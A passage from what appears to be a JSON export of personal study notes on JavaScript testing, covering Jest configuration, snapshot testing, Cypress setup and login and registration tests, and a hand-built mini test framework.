\u003c-- this works as well\n};\n```\n\nThese `testEnviroment`s are actually `node_modules`.\n\n## Support CSS imports with `moduleNameMapper`\n\nImporting styles is handled with `webpack` and `style-loader`, however this only works for the application itself. By default Jest will complain about importing CSS files, because it's not sure how to handle that imports.\n\nWhat we want to do is to _mock_ the non-JS module (CSS being one) with `moduleNameMapper` option:\n\n```js\n// jest.config.js\nmodule.exports = {\n  moduleNameMapper: {\n    \"\\\\.css$\": require.resolve(\"./test/style-mock.js\"),\n  },\n};\n\n// test/style-mock.js\nmodule.exports = {};\n```\n\n## Support Webpack CSS modules with `identity-obj-proxy`\n\nBy just mocking the styles module with `moduleNameMapper` may result in skipping the `className` property (or, to be precise, the `class` attr) in rendered component (`style-mock.js` is an empty object, so `styles.exampleStyle` is `undefined`.\n\nHowever, it may prove useful to add the `className` to the in-test rendered component for many purposes (eg handling the `classNames` logic).\n\nIf we’re using CSS modules with webpack, then we can improve our `moduleNameMapper` to include the css module property name in our tests using `identity-obj-proxy`:\n\n```js\n// jest.config.js\nmodule.exports = {\n  moduleNameMapper: {\n    \"\\\\.module.css$\": \"identity-obj-proxy\",\n  },\n};\n\n// test/style-mock.js\nmodule.exports = {};\n```\n\n`identity-obj-proxy` returns the path that was accessed to resolve a particular module.\n\n## Snapshot testing\n\nIf we'd like to test if the function returns a serializable value, we could just write:\n\n```js\nimport { getFlyingSuperHeros } from \"../super-heros\";\n\ntest(\"returns returns super heros that can fly\", () =\u003e {\n  const flyingHeros = getFlyingSuperHeros();\n  expect(flyingHeros).toEqual([\n    { name: \"Dynaguy\", powers: [\"disintegration ray\", \"fly\"] },\n    { name: \"Apogee\", powers: [\"gravity control\", \"fly\"] },\n  ]);\n});\n```\n\nHowever, at some point `flyingHeroes` might change, and when it'd happen, we'd need to figure out what changes in the object and to manually change the assertion in test case. This can be _semi-automated_ with _snapshot testing_:\n\n```js\nimport { getFlyingSuperHeros } from \"../super-heros\";\n\ntest(\"returns returns super heros that can fly\", () =\u003e {\n  const flyingHeros = getFlyingSuperHeros();\n  expect(flyingHeros).toMatchSnapshot();\n});\n```\n\nThis will make Jest to create a `\u003ctest-filename\u003e.js.snap` file in which the most recent snapshot will live.\n\nIf the snapshot test fails (because the tested object was changed), we can update the snapshot with `jest -u` (_update_).\n\nWe may also use `toMatchInlineSnapshot` - in this case, the snapshot won't live in a separate file. Jest will pass the snapshot to the test file itself. Using `-u` flag will update the test file assertion.\n\nThis also works with serializing and snapshotting the DOM nodes. In such case it's great to use Prettier, to make sure the real HTML and snapshot HTML are formatted in the same manner.\n\n## Custom Jest Snapshot Serializers\n\nIf we're using some custom UI Library, like `emotion`, we may see strange classes in our snapshots. It'd be more clear to see the clear CSS, instead of weird class names.\n\nThe general rule is to use custom Jest Snapshot Serializer.\n\nFor Emotion, this can be done with `@emotion/jest`:\n\n```js\nmodule.exports = {\n  snapshotSerializers: [\"@emotion/jest/serializer\"],\n};\n```\n\n## Custom Module Resolution with `moduleDirectories`\n\nIf we use Webpack's `resolve.modules` configuration to make common utils accessible across the application without relative paths, we need to emulate similar behavior in Jest. To do that, we use `moduleDirectories` configuration option:\n\n```js\nmodule.exports = {\n  moduleDirectories: [\"node_modules\", path.join(__dirname, \"src\"), \"shared\"],\n};\n```\n\nThis will make Jest to look up the imported modules in `node_modules` and in `./shared`. No more relative paths.\n\n## Configuring Jest to run setup for all tests before actual testing\n\nTo take care of test boilerplate and establish a good testing environment for our tests, we use the `setupFilesAfterEnv` option, together with e.g. `@testing-library/jest-dom`.\n\n```js\n// jest.config.js\nmodule.exports = {\n  setupFilesAfterEnv: [\"@testing-library/jest-dom/extend-expect\"],\n};\n```\n\nNote: `@testing-library/jest-dom/extend-expect` is a _script_. It could be any other boilerplate setup script out there.\n\n## Watch Mode\n\nJust use `jest --watch`. Preferably in `npm` script (eg. `test:watch`).\n\nIt uses `git` working copy to determine what files have changed.\n\nInteractive Snapshots (`i`) are quite useful. It's also possible to filter by filename or test description (`p` and `t`).\n\n### `--watchAll`\n\n`jest --watchAll` will open `jest` in watch mode, but will run **all tests** every time any test file changes.\n\nIt's possible to make Jest to automatically run in watch mode in development environment and in _normal_ mode if it's in CI with `is-ci-cli` npm package:\n\n```json\n// package.json\n{\n  \"scripts\": {\n    \"test\": \"is-ci test:coverage test:watch\",\n    \"test:coverage\": \"...\",\n    \"test:watch\": \"...\"\n  }\n}\n```\n\n## Connecting Jest to Node.js Debugger/Chrome DevTools\n\nBy default using the `debugger` keyword won't do anything. To run tests with Node.js debugger, we need:\n\n```sh\nnode --inspect-brk \u003cpath_to_jest_binary\u003e --runInBand // inspect break\n```\n\n`--runInBand` makes sure `jest` will run only in one `node` process (`jest` is spawning processes by default to fasten things up, but it may be forced to use one process - helpful for tests debugging).\n\nThen we can connect the debugger with DevTools. The remote sessions available are from chrome://inspect/.\n\n\u003e [!tip] There also should be possible to use NodeJS button in DevTools upper left\n\n## Using different configuration files\n\nLet's say we have that set options differently (e.g. have different `testEnvironment`):\n\n- `jest.common.config.js`\n- `jest.server.config.js`\n- `jest.client.config.js`\n\nTo make sure the different configuration files target different test files, we can set `testMatch` option:\n\n```js\n// jest.server.config.js\nmodule.exports = {\n  // rootDir: \u003cif custom test file is not in `/`\u003e\n  testMatch: \"./__tests__server__/**/*.test.js\",\n};\n```\n\nThen we need to use `jest --config jest.server.config.js`\n\nThis method would need us to maintain lots of `npm scripts`, since it's not possible to run multiple `watch` sessions at once\n\nAllow to run multiple Jest configurations at once (and reduce the complexity of `npm scripts` by the way).\n\n```js\nmodule.exports = {\n  ...require(\"./jest.common.config.js\"),\n  /* ... */\n  projects: [\"./jest.client.js\", \"./jest.server.js\"],\n};\n```\n\n\u003e [!tip] The _project_ configurations can use `displayName` option to differentiate the output.\n\n### Checking out the configuration\n\nTo display the whole resolved configuration use `jest --config`. The `globalConfig` states the configuration in the root `jest.config.js` file. It'll list also other options that **should be** configured in root config.\n\n## Run ESLint with Jest\n\nIt's possible to change the `runner` which Jest will use - by default it uses `jest-runner`, but we can use e.g. `jest-runner-eslint` to lint the code that'll run `eslint` during evaluation of the project state through `yarn test`.\n\nThis may prove useful when it comes to organize the toolkit around the project especially when it comes to bigger, legacy projects (e.g. ones that weren't linted before, and we want to lint only the code that we changed - improving the code quality gradually).\n\n## Test specific projects in Watch Mode\n\nWith `jest-watch-select-projects` plugin it's possible to specify which projects should be tested in `jest --watch`, similarly to how we select files for current tests run.\n\n```js\nmodule.exports: {\n    watchPlugins: ['jest-watch-select-projects']\n}\n```\n\n## Filtering tests ran with Typeahead support\n\n\u003e [!tip] Typeahead is similar of Intellisense, but non-proprietary\n\nThanks to `jest-watch-typeahead` plugins it's possible to add patternmatching to the tests filtering:\n\n```js\nmodule.exports: {\n    watchPlugins: ['jest-watch-typeahead/filename', 'jest-watch-typeahead/testname']\n}\n```\n\n## Run only relevant tests on Git commit hook\n\n`husky` and `lint-staged` allow to configure the git hook to run tests only\n\n```json\n// package.json\n{\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"lint-staged \u0026\u0026 ...\"\n    }\n  },\n  \"lint-staged\": {\n    \"**/*.+(js|json|css|html|md)\": [\n      \"prettier\",\n      \"jest --findRelatedTests\", // \u003c-- This\n      \"git add\"\n    ]\n  }\n}\n```\n\n`jest --findRelatedTests` will find tests that are related to the files defined in `lint-staged`.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/":{"title":"Testing with Cypress","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/configuring-cypress":{"title":"Fundamentals of testing with Cypress and Testing Library","content":"\nCypress is a tool for E2E testing.\n\nInternally Cypress is an application that runs natively on the computer, but is installed via `npm`/`yarn`.\n\nTo open Cypress application we use `cypress open`. We don't need the application to run tests, we can default to running them in CLI (headless mode), via `cypress run`.\n\n## Configuring Cypress\n\n```json\n// cypress.json\n{\n  \"baseUrl\": \"http://localhost:8080\",\n  \"integrationFolder\": \"cypress/e2e\", // where the test files lie\n  \"viewportHeight\": 900,\n  \"viewportWidth\": 400\n}\n```\n\n\u003e [!tip] The configuration can be viewed from `cypress open`\n\u003e\n\u003e Check out the settings tab to see what options were set and where exactly (`cypress.json`, ENV etc.)\n\n### Enabling `cypress` in `eslint`\n\n```tsx\nmodule.exports = {\n  /* [...] */\n  root: true,\n  plugins: [\"eslint-plugin-cypress\"],\n  extends: [\"plugin:cypress/recommended\"],\n  env: { \"cypress/globals\": true },\n  /* [...] */\n};\n```\n\nIt's also useful to add `cypress/videos` and `cypress/screenshots` to `.gitignore`.\n\n## Installing Cypress Testing Library\n\n```\nyarn add -D @testing-library/cypress\n```\n\n```tsx\n// cypress/support/index.js\n\nimport \"@testing-library/cypress/add-commands\";\n/* [...] */\n```\n\nThis adds `findBy`/`getBy`... methods to `cy` object.\n\n## Scripting Cypruss for local development and CI\n\nBy default we need to run the application in the background for the tests to run. Also, we want to default to `cypress run` for CI.\n\nFor that kind of setup we can use `start-server-and-test` package. `is-ci-cli` package is also useful for determining in which environment we want to run `cypress`.\n\n```json\n{\n  /* [...] */\n  \"scripts\": {\n    \"cy:run\": \"cypress run\",\n    \"cy:open\": \"cypress open\",\n    \"test:e2e\": \"is-ci \\\"test:e2e:run\\\" \\\"test:e2e:dev\\\"\",\n    \"pretest:e2e:run\": \"npm run build\",\n    \"test:e2e:run\": \"start-server-and-test start http://localhost:8080 cy:run\",\n    \"test:e2e:dev\": \"start-server-and-test dev http://localhost:8080 cy:open\",\n    /* [...] */\n\n    \"dev\": \"/* [...] */\",\n    \"start\": \"/* [...] */\",\n    \"setup\": \"npm install\"\n    /* [...] */\n  }\n}\n```\n\n\u003e [!tip] Btw, `npm` has `pre\u003cscripts\u003e` 👌\n\u003e\n\u003e Every script named `pre\u003cother-script\u003e` where `other-script` is an existing `npm` script will run **before** that `other-script`.\n\nWe could set up `husky:precommit` to run E2E tests, but as the project grows, the tests would need lot of time to go through the tests, so it's better to rely on CI for these.\n\n```yml\n# .travis.yml\n\n# [...]\naddons:\n  apt:\n    packages:\n      - libgconf-2-4\ncache:\n  directories:\n    - ~/.npm\n    - ~/.cache\nscript: npm run setup\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/custom-cypress-cmds":{"title":"Custom Cypress commands","content":"\nWe can append commands to `cy` object with usage of _custom commands_. This can be used for making reusable assertions, making HTTP requests directly etc.:\n\n```ts\n// cypress/support/commands.js\nCypress.Commands.add(\"createUser\", (overrides) =\u003e {\n  const user = userBuilder(overrides);\n  return cy\n    .request({\n      url: \"http://localhost:3000/register\",\n      method: \"POST\",\n      body: user,\n    })\n    .then(({ body }) =\u003e body.user);\n});\nCypress.Commands.add(\"assertHome\", () =\u003e {\n  cy.url().should(\"eq\", `${Cypress.config().baseUrl}/`);\n});\n\nCypress.Commands.add(\"assertLoggedInAs\", (user) =\u003e {\n  cy.window().its(\"localStorage.token\").should(\"be.a\", \"string\");\n  cy.findByTestId(\"username-display\").should(\"have.text\", user.username);\n});\n```\n\nAfter that we can use `cy.createUser()`, `cy.assertHome()` and `cy.assertLoggedInAs()` to call them.\n\nWe can use `overrides` to override the default configuration.\n\n## Command `subject`\n\nIf the command returns anything, we can get to this returned value in this way:\n\n```ts\ncy.createUser().then(user =\u003e /* [...] */)\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/cy-request-fn":{"title":"cy.request fn","content":"\nWe can use `cy.request(req)` to make HTTP calls directly from Cypress.\n\n```ts\ncy.request({\n  url: \"http://localhost:3000/register\",\n  method: \"POST\",\n  body: user,\n});\n```\n\nThese requests are usually reusable and can be used as [[development/testing-javascript/cypress/custom-cypress-cmds]].\n\nTypically, `cy.request`s are faster than calling HTTP from within the tested app.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/debugging-tests":{"title":"Debugging tests in Cypress","content":"\nTo debug the test, we can use this `Promise` like syntax:\n\n```tsx\ndescribe(\"anonymous calculator\", () =\u003e {\n  it(\"can make calculations\", () =\u003e {\n    /* [...] */\n    cy.findByText(/^\\+$/)\n      .then((subject) =\u003e {\n        debugger;\n        return subject;\n      })\n      // .pause()\n      .click();\n\n    /* [...] */\n  });\n});\n```\n\nIf we call the `debugger` and have Dev Tools in Cypress opened, the test will pause and we're be redirected to Source tab in Dev Tools.\n\nWe also want to return the `subject` to maintain it through the chain of interactions.\n\n`subject` is a jQuery node, btw.\n\nWe can also use `.pause()` to pause the execution without moving us to Dev Tools debugger. To resume the test, press ⏯️ in Cypress window.\n\n`console.log`s go to Cypresses Dev Tools.\n\nWe could also mess with the Component code as well, as Cypress injects itself into `window`:\n\n```tsx\nfunction Calculator() {\n  const [theme, setTheme] = useState();\n  if (window.Cypress) {\n    window.setTheme = setTheme;\n  }\n}\n```\n\n\u003e [!danger] We need to keep in mind we want the tests to resemble **how the user would interact with the component**\n\u003e\n\u003e Probably the user won't use `window.setTheme` on his own. But this can help develop tests in the first place.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/first-cypress-test":{"title":"First test in Cypress","content":"\n\u003e [!tip] Keep in mind the tested application needs to be running in the background\n\n```tsx\ndescribe(\"anonymous calculator\", () =\u003e {\n  it(\"can make calculations\", () =\u003e {\n    cy.visit(\"/\");\n    cy.findByText(/^1$/).click();\n    cy.findByText(/^\\+$/).click();\n    cy.findByText(/^2$/).click();\n    cy.findByText(/^=$/).click();\n    cy.findByTestId(\"total\").should(\"have.text\", \"3\");\n  });\n});\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/install-react-dev-tools":{"title":"Install React Dev Tools in Cypress","content":"\nIf we run Cypress in Chrome-based browser that has the React Dev Tools extension installed, we still need to register the tested app in DevTools.\n\nIn our app:\n\n```ts\n// src/react-devtools-hook.js\n\nif (window.Cypress) {\n  window.__REACT_DEVTOOLS_GLOBAL_HOOK__ =\n    window.parent.__REACT_DEVTOOLS_GLOBAL_HOOK__;\n}\n```\n\n```ts\n// src/index.js\n\nimport \"./react-devtools-hook\"; // in the first line!\n/* [...] */\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/testing-login-flow":{"title":"Testing login flow in Cypress","content":"\nThe simplest form of testing the login flow would be to make Cypress register, login and logout several times:\n\n```ts\nimport { userBuilder } from \"../support/generate\";\ndescribe(\"login\", () =\u003e {\n  it(\"should login an existing user\", () =\u003e {\n    const user = userBuilder();\n\n    cy.visit(\"/\");\n    cy.findByText(/register/i).click();\n    cy.findByLabelText(/username/i).type(user.username);\n    cy.findByLabelText(/password/i).type(user.password);\n    cy.findByText(/submit/i).click();\n    cy.findByText(/login/i).click();\n    cy.findByLabelText(/username/i).type(user.username);\n    cy.findByLabelText(/password/i).type(user.password);\n    cy.findByText(/submit/i).click();\n    cy.findByText(/logout/i).click();\n  });\n});\n```\n\nBut we are a bit of overtesting here. We have a very similar flow to the one presented in [[development/testing-javascript/cypress/testing-registration-flow]]. If there would be an error, we'd have it visible in many test cases, which might obscure where the issue really occures. Also, it makes Cypress to run longer.\n\nWe can make Cypress to handle the `/login` request for us with [[development/testing-javascript/cypress/cy-request-fn]] as a [[development/testing-javascript/cypress/custom-cypress-cmds|custom command]].\n\n```ts\ndescribe(\"login\", () =\u003e {\n  it(\"should login an existing user\", () =\u003e {\n    cy.createUser().then((user) =\u003e {\n      cy.visit(\"/\");\n      cy.findByText(/login/i).click();\n      cy.findByLabelText(/username/i).type(user.username);\n      cy.findByLabelText(/password/i).type(user.password);\n      cy.findByText(/submit/i).click();\n      cy.findByText(/logout/i).click();\n      cy.findByText(/login/i).click();\n      cy.findByLabelText(/username/i).type(user.username);\n      cy.findByLabelText(/password/i).type(user.password);\n      cy.findByText(/submit/i).click();\n      cy.findByText(/logout/i).click();\n    });\n  });\n});\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/cypress/testing-registration-flow":{"title":"Testing registration flow in Cypress","content":"\nWith E2E testing, there might be a situation we want to test a form by providing some data. However, the data we provided may already exist in the database.\n\nWe could cleanup the DB for testing before each test, but this may be troublesome (or even not possible at all).\n\nWe can create the `userBuilder()` fn in `support/generate.ts` that uses `test-data-bot`:\n\n```ts\n// support/generate.ts\nimport { build, fake } from \"test-data-bot\";\n\nconst userBuilder = build(\"User\").fields({\n  username: fake((f) =\u003e f.internet.userName()),\n  password: fake((f) =\u003e f.internet.password()),\n});\n\nexport { userBuilder };\n```\n\n```ts\n// cypress/e2e/register.ts\nimport { userBuilder } from \"../support/generate\";\n\ndescribe(\"registration\", () =\u003e {\n  it(\"should register a new user\", () =\u003e {\n    // given\n    const user = userBuilder();\n    // when\n    cy.visit(\"/\");\n    cy.findByText(/register/i).click();\n    cy.findByLabelText(/username/i).type(user.username);\n    cy.findByLabelText(/password/i).type(user.password);\n    cy.findByText(/submit/i).click();\n    // then\n    cy.url().should(\"eq\", `${Cypress.config().baseUrl}/`);\n    cy.window().its(\"localStorage.token\").should(\"be.a\", \"string\");\n    cy.findByTestId(\"username-display\").should(\"have.text\", user.username);\n  });\n});\n```\n\n## Simulate HTTP errors in Cypress\n\nWe need to intercept HTTP request in Cypress with `cy.server()` and `cy.route()`.\n\n```ts\nit(`should show an error message if there's an error registering`, () =\u003e {\n  cy.server();\n  cy.route({\n    method: \"POST\",\n    url: \"http://localhost:3000/register\",\n    status: 500,\n    response: {},\n  });\n  cy.visit(\"/register\");\n  cy.findByText(/submit/i).click();\n  cy.findByText(/error.*try again/i);\n});\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/fundamentals/":{"title":"Testing Fundamentals","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/fundamentals/dom-testing-library":{"title":"DOM Testing Library","content":"\nDOM Testing Library is the simplest, yet complete testing utility. It's a part of [`@testing-library`](https://testing-library.com/docs/) family.\n\nIt's possible to use **DOM Testing Library** to test in virtually any JS framework out there (yep, even jQuery), however it's not that much practical.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/fundamentals/pyramid-of-testing":{"title":"Pyramid of Testing","content":"\n- [[development/testing-javascript/static-analysis|Static analysis]]\n  - type errors and typs\n- [[development/testing-javascript/jest/_index|Unit tests]]\n  - verifying that isolated parts of the system work as expected\n- [[development/testing-javascript/jest/integration-tests-using-rtl|Integration tests]]\n  - verifying that several units work as intended when connected\n- [[development/testing-javascript/cypress/_index|E2E]] (functional tests)\n  - army of robots that clicks around the app and verifies that the app works correctly as a whole system\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/fundamentals/simple-testing-framework":{"title":"Simple testing framework in JS","content":"\nHere's an example of how the simple, `jest`-like testing framework would look like.\n\n## The simplest test\n\nThe automated test in JS is a code that throws an `Error` if the assumption does not match the result (the result is **unexpected**).\n\nThe simplest form of the passing test:\n\n```js\nconst { sum, subtract } = require(\"./math\");\nlet result, expected;\n\nresult = sum(3, 7);\nexpected = 10;\nif (result !== expected) {\n  throw new Error(`${result} is not equal to ${expected}`);\n}\n\nresult = subtract(7, 3);\nexpected = 4;\nif (result !== expected) {\n  throw new Error(`${result} is not equal to ${expected}`);\n}\n```\n\nTo write the **_test_**, we need to write a code that throws an `Error` with a **useful message** to understand what's wrong with our code.\n\nIt is relatively easy and reliable to test pure functions this way.\n\nThe error thrown can be abstracted into a function taking `actual` as a parameter and returning `toBe(expected)` fn.\n\n```ts\nfunction sum(a: number, b: number): number {\n  return a - b; // This fn is broken\n}\n\nfunction expect(actual: any) {\n  return {\n    toBe(expected: any) {\n      if (actual !== expected) {\n        throw new Error(`${actual} is not equal to ${expected}`);\n      }\n    },\n    toEqual(expected: any) {\n      /* ...*/\n    },\n    toBeGreatherThan(expected: any) {\n      /* ...*/\n    },\n    // etc.\n  };\n}\n\nexpect(sum(3, 7)).toBe(10);\n```\n\n## Encapsulating the tests into simple _framework_\n\nIn the simple case above, once any of the tests fails, the subsequent ones won't run. In addition of that, the stacktrace would display that the **`Error` occured in the same line it was thrown** (`:9`), whereas we'd like to see the broken sum fn as the reason for failing test (without digging through the stacktrace).\n\nThat's why we should encapsulate and isolate tests:\n\n```ts\nfunction sum(a: number, b: number): number {\n  return a - b; // This fn is broken\n}\n\nfunction subtract(a: number, b: number): number {\n  return a - b;\n}\n\nfunction expect(actual) {\n  return {\n    toBe(expected) {\n      if (actual !== expected) {\n        throw new Error(`${actual} is not equal to ${expected}`);\n      }\n    },\n  };\n}\n\nfunction test(title, callback) {\n  try {\n    callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\ntest(\"sum adds numbers\", () =\u003e {\n  const result = sum(3, 7);\n  expect(result).toBe(10);\n});\n\ntest(\"subtract subtracts numbers\", () =\u003e {\n  const result = subtract(7, 3);\n  expect(result).toBe(4);\n});\n```\n\nTo sum up, the test should allow the developer to **quickly find what's broken**, without having to delve into the stack trace and else.\n\n## Adding a way of testing `async` code\n\nSimple adding `async` to the `callback()` fns and `await`ing for the result would cause the tests to falsely pass and to throw an `UnhandledPromiseRejection` `Error` with the reason of rejection (being our actual broken `sum` fn).\n\n```sh\n$ ts-node test.ts\n[ok] sum adds numbers\n[ok] subtract subtracts numbers\n\nthrow new Error (${actual} is not equal to ${expected});\nError: -4 is not equal to 10\nat [...]\n```\n\nThis is due to the fact that `async () =\u003e { /* test case */ }` returns a `Promise`. The `Error` thrown by the broken `sum()` in the test case causes **rejection of that `Promise`**. The `callback()` call inside `test()` returns that `Promise` without passing the error down. That's why we need to add `async/await` clauses to the `test` fn itself.\n\n```ts\nasync function test(title: string, callback: () =\u003e any) {\n  try {\n    await callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\ntest(\"sum adds numbers\", async () =\u003e {\n  const result = await sum(3, 7);\n  const expected = 10;\n  expect(result).toBe(expected);\n});\n```\n\n## Making test fns global\n\nWe want the test fns to be accessible in different `*.test.ts` files. However, we don't want to have to import the fns in each of test file (many testing frameworks seem to _embrace_ the global functions).\n\nTo make them so we can create a `setup-globals.ts` with the `test` and `expect` fns torn out...\n\n```ts\n// setup-globals.ts\nfunction expect(actual: any) {\n  return {\n    toBe(expected: any) {\n      if (actual !== expected) {\n        throw new Error(`${actual} is not equal to ${expected}`);\n      }\n    },\n  };\n}\n\nasync function test(title: string, callback: () =\u003e any) {\n  try {\n    await callback();\n    console.log(`[ok] ${title}`);\n  } catch (error) {\n    console.error(`[not ok] ${title}`);\n    console.error(error);\n  }\n}\n\nglobal.expect = expect;\nglobal.test = test;\n```\n\n```ts\n// test.ts\nfunction sum(a: number, b: number): number {\n  return a - b;\n}\n\nfunction subtract(a: number, b: number): number {\n  return a - b;\n}\n\ntest(\"sum adds numbers\", async () =\u003e {\n  const result = await sum(3, 7);\n  const expected = 10;\n  expect(result).toBe(expected);\n});\n\ntest(\"subtract subtracts numbers\", () =\u003e {\n  const result = subtract(7, 3);\n  const expected = 4;\n  expect(result).toBe(expected);\n});\n```\n\n...and run the tests in this manner:\n\n```sh\n$ ts-node --require ./setup-globals.ts test.ts\n```\n\nThat being said, we've just created micro, `jest`-like testing framework.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/":{"title":"Testing with Jest","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/fake-data":{"title":"Using fake data in tests","content":"\nIt's actually better to generate data for tests than hardcoding it. The data itself is not important, so it doesn't matter if the hardcoded string is `Test title` from the tests standpoint. This bloats the test cases and may hint that the string is important, even if it isn't.\n\n\u003e [!tip] We need to know what we want to _communicate_ with our tests.\n\nThanks to `test-data-bot` library it's possible to _fake_ the data.\n\n```tsx\nimport * as React from \"react\";\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\nimport { build, fake, sequence } from \"test-data-bot\";\nimport { savePost as mockSavePost } from \"../api\";\nimport { Editor } from \"../post-editor\";\n\nconst postBuilder = build(\"Post\").fields({\n  title: fake((f) =\u003e f.lorem.words()),\n  content: fake((f) =\u003e f.lorem.paragraphs().replace(/\\r/g, \"\")),\n  tags: fake((f) =\u003e [f.lorem.word(), f.lorem.word(), f.lorem.word()]),\n});\n\nconst userBuilder = build(\"User\").fields({\n  id: sequence((s) =\u003e `user-${s}`),\n});\n\ntest(\"renders a form with title, content, tags, and a submit button\", async () =\u003e {\n  /* [...] */\n  const fakeUser = userBuilder();\n  const fakePost = postBuilder();\n  render(\u003cEditor user={fakeUser} /\u003e);\n\n  screen.getByLabelText(/title/i).value = fakePost.title;\n  screen.getByLabelText(/content/i).value = fakePost.content;\n  screen.getByLabelText(/tags/i).value = fakePost.tags.join(\", \");\n  const submitButton = screen.getByText(/submit/i);\n  userEvent.click(submitButton);\n\n  expect(mockSavePost).toHaveBeenCalledWith({\n    ...fakePost,\n    date: expect.any(String),\n    authorId: fakeUser.id,\n  });\n  /* [...] */\n});\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/development/testing-javascript/jest/integration-tests-using-rtl":{"title":"Integration tests using Testing Library","content":"\nThe idea of integration test is to test an entire page, or maybe even an entire app by writing tests that navigate around the app as the normal user would.\n\nLet's assume we have a multi-form application like that:\n\n```js\n// app.js\nimport React, { createContext, useContext, useReducer, useState } from \"react\";\nimport { BrowserRouter as Router, Route, Link, Switch } from \"react-router-dom\";\nimport { submitForm } from \"./api\";\n\nconst MultiPageForm = createContext();\n\nfunction MultiPageFormProvider({ initialValues = {}, ...props }) {\n  const [initState] = useState(initialValues);\n  const [form, setFormValues] = useReducer(\n    (s, a) =\u003e ({ ...s, ...a }),\n    initState,\n  );\n  const resetForm = () =\u003e setFormValues(initialValues);\n  return (\n    \u003cMultiPageForm.Provider\n      value={{ form, setFormValues, resetForm }}\n      {...props}\n    /\u003e\n  );\n}\n\nfunction useMultiPageForm() {\n  const context = useContext(MultiPageForm);\n  if (!context) {\n    throw new Error(\n      \"useMultiPageForm must be used within a MultiPageFormProvider\",\n    );\n  }\n  return context;\n}\n\nfunction Main() {\n  return (\n    \u003c\u003e\n      \u003ch1\u003eWelcome home\u003c/h1\u003e\n      \u003cLink to=\"/page-1\"\u003eFill out the form\u003c/Link\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction Page1({ history }) {\n  const { form, setFormValues } = useMultiPageForm();\n  return (\n    \u003c\u003e\n      \u003ch2\u003ePage 1\u003c/h2\u003e\n      \u003cform\n        onSubmit={(e) =\u003e {\n          e.preventDefault();\n          history.push(\"/page-2\");\n        }}\n      \u003e\n        \u003clabel htmlFor=\"food\"\u003eFavorite Food\u003c/label\u003e\n        \u003cinput\n          id=\"food\"\n          value={form.food}\n          onChange={(e) =\u003e setFormValues({ food: e.target.value })}\n        /\u003e\n      \u003c/form\u003e\n      \u003cLink to=\"/\"\u003eGo Home\u003c/Link\u003e | \u003cLink to=\"/page-2\"\u003eNext\u003c/Link\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction Page2({ history }) {\n  const { form, setFormValues } = useMultiPageForm();\n  return (\n    \u003c\u003e\n      \u003ch2\u003ePage 2\u003c/h2\u003e\n      \u003cform\n        onSubmit={(e) =\u003e {\n          e.preventDefault();\n          history.push(\"/confirm\");\n        }}\n      \u003e\n        \u003clabel htmlFor=\"drink\"\u003eFavorite Drink\u003c/label\u003e\n        \u003cinput\n          id=\"drink\"\n          value={form.drink}\n          onChange={(e) =\u003e setFormValues({ drink: e.target.value })}\n        /\u003e\n      \u003c/form\u003e\n      \u003cLink to=\"/page-1\"\u003eGo Back\u003c/Link\u003e | \u003cLink to=\"/confirm\"\u003eReview\u003c/Link\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction Confirm({ history }) {\n  const { form, resetForm } = useMultiPageForm();\n  function handleConfirmClick() {\n    submitForm(form).then(\n      () =\u003e {\n        resetForm();\n        history.push(\"/success\");\n      },\n      (error) =\u003e {\n        history.push(\"/error\", { error });\n      },\n    );\n  }\n  return (\n    \u003c\u003e\n      \u003ch2\u003eConfirm\u003c/h2\u003e\n      \u003cdiv\u003e\n        \u003cstrong\u003ePlease confirm your choices\u003c/strong\u003e\n      \u003c/div\u003e\n      \u003cdiv\u003e\n        \u003cstrong id=\"food-label\"\u003eFavorite Food\u003c/strong\u003e:{\" \"}\n        \u003cspan aria-labelledby=\"food-label\"\u003e{form.food}\u003c/span\u003e\n      \u003c/div\u003e\n      \u003cdiv\u003e\n        \u003cstrong id=\"drink-label\"\u003eFavorite Drink\u003c/strong\u003e:{\" \"}\n        \u003cspan aria-labelledby=\"drink-label\"\u003e{form.drink}\u003c/span\u003e\n      \u003c/div\u003e\n      \u003cLink to=\"/page-2\"\u003eGo Back\u003c/Link\u003e |{\" \"}\n      \u003cbutton onClick={handleConfirmClick}\u003eConfirm\u003c/button\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction Success() {\n  return (\n    \u003c\u003e\n      \u003ch2\u003eCongrats. You did it.\u003c/h2\u003e\n      \u003cdiv\u003e\n        \u003cLink to=\"/\"\u003eGo home\u003c/Link\u003e\n      \u003c/div\u003e\n    \u003c/\u003e\n  );\n}\n\nfunction Error({\n  location: {\n    state: { error },\n  },\n}) {\n  return (\n    \u003c\u003e\n      \u003cdiv\u003eOh no. There was an error.\u003c/div\u003e\n      \u003cpre\u003e{error.message}\u003c/pre\u003e\n     